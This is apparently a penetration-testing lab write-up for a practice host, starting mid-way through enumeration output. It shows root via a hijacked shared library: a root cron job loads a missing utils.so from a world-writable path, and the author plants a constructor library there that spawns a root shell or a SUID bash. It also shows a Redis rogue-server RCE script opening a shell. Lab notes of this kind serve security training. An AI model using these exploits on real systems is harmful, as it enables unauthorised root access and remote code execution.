[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
[!] ret060 Can we write to executable paths present in cron jobs........... yes!
---
/etc/crontab:LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
---
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope                                                                                        
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                        
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                        
[i] net520 ARP table....................................................... skip                                                                                        
[i] net530 Nameservers..................................................... skip                                                                                        
[i] net540 Systemd Nameservers............................................. skip                                                                                        
[i] net550 Listening TCP................................................... skip                                                                                        
[i] net560 Listening UDP................................................... skip                                                                                        
===============================================================( services )=====                                                                                        
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                        
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                        
[i] sof520 Postgres version................................................ skip                                                                                        
[i] sof530 Apache version.................................................. skip                                                                                        
[i] sof540 Tmux version.................................................... skip                                                                                        
[i] sof550 Screen version.................................................. skip                                                                                        
=============================================================( containers )=====                                                                                        
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                        
                                                                                                                                                                        
==================================( FINISHED )==================================                              
[pablo@sybaris tmp]$ 
```

```bash
[pablo@sybaris tmp]$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
MAILTO=""

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
  *  *  *  *  * root       /usr/bin/log-sweeper
[pablo@sybaris tmp]$ ldd /usr/bin/log-sweeper
        linux-vdso.so.1 =>  (0x00007fffa8523000)
        utils.so => not found
        libc.so.6 => /lib64/libc.so.6 (0x00007f71a67a8000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f71a6b76000)
[pablo@sybaris tmp]$ uname -a
Linux sybaris 3.10.0-1127.19.1.el7.x86_64 #1 SMP Tue Aug 25 17:23:54 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
[pablo@sybaris tmp]$ ls -al /usr/local/lib/dev
total 0
drwxrwxrwx  2 root root  6 Sep  7  2020 .
drwxr-xr-x. 4 root root 30 Sep  7  2020 ..
[pablo@sybaris tmp]$ nano utils.c
-bash: nano: command not found
[pablo@sybaris tmp]$ vi utils.c
[pablo@sybaris tmp]$ cat utils.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
}
[pablo@sybaris tmp]$ gcc -shared -fPIC utils.c -o /usr/local/lib/dev/utils.so
[pablo@sybaris tmp]$ vi utils.c
[pablo@sybaris tmp]$ cat utils.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        setgid(0);
        system("cp /bin/bash /bash && chmod u+s /bash");
}
[pablo@sybaris tmp]$ gcc -shared -fPIC utils.c -o /usr/local/lib/dev/utils.so
[pablo@sybaris tmp]$ ls /bash
ls: cannot access /bash: No such file or directory
[pablo@sybaris tmp]$
```


```bash
ls: cannot access /bash: No such file or directory
[pablo@sybaris tmp]$ ls /bash
/bash
[pablo@sybaris tmp]$ /bash -p
bash-4.2# cd /root
bash-4.2# cat proof.txt
b91157f43b93961cd9b89c2d797e6083
bash-4.2# ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.142.93  netmask 255.255.255.0  broadcast 192.168.142.255
        ether 00:50:56:ba:f6:12  txqueuelen 1000  (Ethernet)
        RX packets 146974  bytes 11333269 (10.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16530  bytes 33294383 (31.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 152  bytes 12324 (12.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 152  bytes 12324 (12.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

bash-4.2# 
```

# Others

## Off the self exploit

![](Pasted%20image%2020220309082032.png)

```bash
┌──(kali㉿kali)-[/tmp/redis-rce]
└─$ sudo python redis-rce.py -r 192.168.172.93  -L 192.168.49.172  -f ../RedisModules-ExecuteCommand/module.so -P 6379

█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   


[*] Connecting to  192.168.172.93:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.172.93:6379
[*] Setting filename
[+] Accepted connection from 192.168.172.93:6379
[*] Start listening on 192.168.49.172:6379
[*] Tring to run payload
[+] Accepted connection from 192.168.172.93:40678
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i
[+] Interactive shell open , use "exit" to exit...
$ whoami
$ whoami
pablo
$ pwd
pablo
$ pwd
/tmp
$ 
/tmp
$ 
$ 
$ ls
$ 
module.so
systemd-private-119bab4332474881bb99a88f1500f07a-chronyd.service-U6HUud
systemd-private-119bab4332474881bb99a88f1500f07a-httpd.service-hwA6h6
systemd-private-a7a5d71bb87543e9bc9f26cf72f92e27-chronyd.service-lkGvL6
systemd-private-a7a5d71bb87543e9bc9f26cf72f92e27-httpd.service-tTSYTj
vmware-root_641-3988031969
vmware-root_650-2696943027
vmware-root_651-4013395565
$ 

```